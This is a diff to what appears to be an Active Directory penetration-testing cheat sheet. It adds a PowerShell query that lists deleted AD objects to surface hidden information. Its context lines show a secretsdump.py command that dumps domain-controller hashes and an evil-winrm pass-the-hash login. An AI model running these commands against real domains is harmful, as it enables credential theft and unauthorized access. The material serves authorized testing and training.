@@ -659,6 +659,14 @@ python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
 evil-winrm -i <dc-ip> -u <username> -H '<hash>' 
 ```
 
+### :open_file_folder: AD Recycle Bin
+
+find hidden information
+
+```powershell
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
